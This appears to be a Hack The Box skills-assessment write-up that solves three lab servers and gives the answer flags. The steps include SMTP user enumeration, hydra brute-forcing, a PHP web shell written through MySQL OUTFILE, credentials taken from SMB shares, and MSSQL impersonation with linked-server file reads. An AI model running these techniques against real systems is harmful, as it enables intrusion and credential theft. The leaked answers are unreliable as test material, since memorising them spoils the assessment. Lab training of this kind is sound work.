# SKILLS ASSESSMENT
## EASY
We were commissioned by the company Inlanefreight to conduct a penetration test against three different hosts to check the servers' configuration and security. We were informed that a flag had been placed somewhere on each server to prove successful access. These flags have the following format:

`HTB{...}`

Our task is to review the security of each of the three servers and present it to the customer. According to our information, the first server is a server that manages emails, customers, and their files.

**Task:** You are targeting the inlanefreight.htb domain. Assess the target server and obtain the contents of the flag.txt file. Submit it as the answer. **Answer: HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49}**

1. Enumerate the target:
    ```sh
    $ nmap -Pn -sV 10.129.36.98
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-11 01:25 CST
    Nmap scan report for 10.129.36.98
    Host is up (0.23s latency).
    Not shown: 993 filtered tcp ports (no-response)
    PORT     STATE SERVICE       VERSION
    21/tcp   open  ftp
    25/tcp   open  smtp          hMailServer smtpd
    80/tcp   open  http          Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/7.4.29)
    443/tcp  open  ssl/https
    587/tcp  open  smtp          hMailServer smtpd
    3306/tcp open  mysql         MySQL 5.5.5-10.4.24-MariaDB
    3389/tcp open  ms-wbt-server Microsoft Terminal Services
    ```

2. Since the target is a SMTP server, try to enumerate the users → found user `fiona`:
    ```sh
    $ smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t 10.129.36.98
    Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

    ----------------------------------------------------------
    |                   Scan Information                       |
    ----------------------------------------------------------

    Mode ..................... RCPT
    Worker Processes ......... 5
    Usernames file ........... users.list
    Target count ............. 1
    Username count ........... 79
    Target TCP port .......... 25
    Query timeout ............ 5 secs
    Target domain ............ inlanefreight.htb

    ######## Scan started at Wed Feb 11 01:36:29 2026 #########
    10.129.36.98: fiona@inlanefreight.htb exists
    ######## Scan completed at Wed Feb 11 01:36:47 2026 #########
    1 results.
    ```

3. Try to brute-force the MySQL service with the found username → found credential for DB `fiona:987654321`
```sh
$ hydra -l fiona -P rockyou.txt 10.129.36.121 mysql
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-11 02:41:52
[INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking mysql://10.129.36.121:3306/
[3306][mysql] host: 10.129.36.121   login: fiona   password: 987654321
1 of 1 target successfully completed, 1 valid password found
```

4. Since `secure_file_priv` is empty, we can write files via MySQL. Write a PHP backdoor to `C:\xampp\htdocs\backdoor.php`:
```sh
$ mysql -u fiona -p -h 10.129.36.121
Enter password: 987654321
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 178
Server version: 10.4.24-MariaDB mariadb.org binary distribution

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show variables like "secure_file_priv";
+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+
1 row in set (0.240 sec)

MariaDB [(none)]> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE 'C:\\xampp\\htdocs\\backdoor.php';
Query OK, 1 row affected (0.231 sec)
```

5. Read the flag via the PHP backdoor at `C:\Users\Administrator\Desktop\flag.txt`
```
$ curl 'http://10.129.36.121/backdoor.php?c=type%20C:\Users\Administrator\Desktop\flag.txt'
HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49}
```

## MEDIUM
The second server is an internal server (within the inlanefreight.htb domain) that manages and stores emails and files and serves as a backup of some of the company's processes. From internal conversations, we heard that this is used relatively rarely and, in most cases, has only been used for testing purposes so far.

**Task:** Assess the target server and find the flag.txt file. Submit the contents of this file as your answer.. **Answer: HTB{1qay2wsx3EDC4rfv_M3D1UM}**

1. Enumerate the target with full port scan:
```sh
$ nmap -Pn -sV -p- 10.129.36.136
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-11 03:07 CST
Nmap scan report for 10.129.36.136
Host is up (0.24s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
53/tcp   open  domain   ISC BIND 9.16.1 (Ubuntu Linux)
110/tcp  open  pop3     Dovecot pop3d
995/tcp  open  ssl/pop3 Dovecot pop3d
2121/tcp open  ftp
30021/tcp open  ftp
```

2. Tries login as anonymous to the FTP service at port 30021 and found interesting notes:
```sh
$ ftp 10.129.36.136 30021
Connected to 10.129.36.136.
220 ProFTPD Server (Internal FTP) [10.129.36.136]
Name (10.129.36.136:root): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: 
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||36933|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   2 ftp      ftp          4096 Apr 18  2022 simon
226 Transfer complete
ftp> cd simon
250 CWD command successful
ftp> ls
229 Entering Extended Passive Mode (|||2592|)
150 Opening ASCII mode data connection for file list
-rw-rw-r--   1 ftp      ftp           153 Apr 18  2022 mynotes.txt
226 Transfer complete
ftp> get mynotes.txt
local: mynotes.txt remote: mynotes.txt
```

3. This note might be the passwords for the `simon` account:
```sh
$ cat mynotes.txt 
234987123948729384293
+23358093845098
ThatsMyBigDog
Rock!ng#May
Puuuuuh7823328
8Ns8j1b!23hs4921smHzwn
237oHs71ohls18H127!!9skaP
238u1xjn1923nZGSb261Bs81
```

4. Brute-force the `simon` account with the retrieved password list and retrieve credential for the FTP service at port 2121 (`simon:8Ns8j1b!23hs4921smHzwn`):
```sh
$ hydra -l simon -P mynotes.txt -s 2121 ftp://10.129.36.136
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-11 03:59:07
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 8 tasks per 1 server, overall 8 tasks, 8 login tries (l:1/p:8), ~1 try per task
[DATA] attacking ftp://10.129.36.136:2121/
[2121][ftp] host: 10.129.36.136   login: simon   password: 8Ns8j1b!23hs4921smHzwn
1 of 1 target successfully completed, 1 valid password found
```

5. Login with the retrieved credential and read the flag:
```sh
$ ftp 10.129.36.136 2121
Connected to 10.129.36.136.
220 ProFTPD Server (InlaneFTP) [10.129.36.136]
Name (10.129.36.136:root): simon
331 Password required for simon
Password: 
230 User simon logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||36088|)
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 root     root           29 Apr 20  2022 flag.txt
drwxrwxr-x   3 simon    simon        4096 Apr 18  2022 Maildir
226 Transfer complete
ftp> more flag.txt
```

## HARD
The third server is another internal server used to manage files and working material, such as forms. In addition, a database is used on the server, the purpose of which we do not know.

**Task:** What file can you retrieve that belongs to the user "simon"? (Format: filename.txt) **Answer: random.txt**

```sh
$ nmap -sV -Pn -p- 10.129.203.10
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-11 04:09 CST
Nmap scan report for 10.129.203.10
Host is up (0.24s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
445/tcp  open  microsoft-ds?
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
3389/tcp open  ms-wbt-server Microsoft Terminal Services
```

```sh
$ smbclient -L //10.129.203.10 -N

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	Home            Disk      
	IPC$            IPC       Remote IPC
```

```sh
$ smbclient //10.129.203.10/Home
Password for [WORKGROUP\htb-ac-1863259]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Apr 21 16:18:21 2022
  ..                                  D        0  Thu Apr 21 16:18:21 2022
  HR                                  D        0  Thu Apr 21 15:04:39 2022
  IT                                  D        0  Thu Apr 21 15:11:44 2022
  OPS                                 D        0  Thu Apr 21 15:05:10 2022
  Projects                            D        0  Thu Apr 21 15:04:48 2022

		7706623 blocks of size 4096. 3167349 blocks available
smb: \> cd IT
smb: \IT\> ls
  .                                   D        0  Thu Apr 21 15:11:44 2022
  ..                                  D        0  Thu Apr 21 15:11:44 2022
  Fiona                               D        0  Thu Apr 21 15:11:53 2022
  John                                D        0  Thu Apr 21 16:15:09 2022
  Simon                               D        0  Thu Apr 21 16:16:07 2022

		7706623 blocks of size 4096. 3167267 blocks available
smb: \IT\> cd Simon
smb: \IT\Simon\> ls
  .                                   D        0  Thu Apr 21 16:16:07 2022
  ..                                  D        0  Thu Apr 21 16:16:07 2022
  random.txt                          A       94  Thu Apr 21 16:16:48 2022

		7706623 blocks of size 4096. 3167334 blocks available
```

**Task:** Enumerate the target and find a password for the user Fiona. What is her password? **Answer: 48Ns72!bns74@S84NNNSl**

```sh
$ smbclient //10.129.203.10/Home
Password for [WORKGROUP\htb-ac-1863259]:
Try "help" to get a list of possible commands.
smb: \> cd IT
smb: \IT\> cd Fiona
smb: \IT\Fiona\> ls
  .                                   D        0  Thu Apr 21 15:11:53 2022
  ..                                  D        0  Thu Apr 21 15:11:53 2022
  creds.txt                           A      118  Thu Apr 21 15:13:11 2022

		7706623 blocks of size 4096. 3167326 blocks available
smb: \IT\Fiona\> get creds.txt
getting file \IT\Fiona\creds.txt of size 118 as creds.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
```

```sh
$ cat creds.txt 
Windows Creds

kAkd03SA@#!
48Ns72!bns74@S84NNNSl
SecurePassword!
Password123!
SecureLocationforPasswordsd123!!
```

```sh
$ hydra -l Fiona -P creds.txt 10.129.203.10 rdp
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-11 04:38:31
[WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
[DATA] max 4 tasks per 1 server, overall 4 tasks, 5 login tries (l:1/p:5), ~2 tries per task
[DATA] attacking rdp://10.129.203.10:3389/
[3389][rdp] host: 10.129.203.10   login: Fiona   password: 48Ns72!bns74@S84NNNSl
1 of 1 target successfully completed, 1 valid password found
```

**Task:** Once logged in, what other user can we compromise to gain admin privileges? **Answer: john**


```sh
$ mssqlclient.py -p 1433 fiona@10.129.203.10 -windows-auth
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(WIN-HARD\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(WIN-HARD\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (WIN-HARD\Fiona  guest@master)> SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
name    
-----   
john    

simon   

SQL (WIN-HARD\Fiona  guest@master)>  EXECUTE AS LOGIN = 'john' SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER('sysadmin')
       
----   
john   

   0   

SQL (john  guest@master)>
```

**Task:** Submit the contents of the flag.txt file on the Administrator Desktop. **Answer: HTB{46u\$!n9\_l!nk3d\_\$3rv3r\$}**

```sh

SQL (john  guest@master)> SELECT srvname, isremote FROM sysservers
srvname                 isremote   
---------------------   --------   
WINSRV02\SQLEXPRESS            1   

LOCAL.TEST.LINKED.SRV          0   

SQL (john  guest@master)> EXEC ('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [LOCAL.TEST.LINKED.SRV]
                
-   -   -   -   
1   1   1   1   

SQL (john  guest@master)> EXEC ('SELECT BulkColumn FROM OPENROWSET(BULK ''C:\Users\Administrator\Desktop\flag.txt'', SINGLE_CLOB) AS x;') AT [LOCAL.TEST.LINKED.SRV];
BulkColumn                       
------------------------------   
b'HTB{46u$!n9_l!nk3d_$3rv3r$}'
```
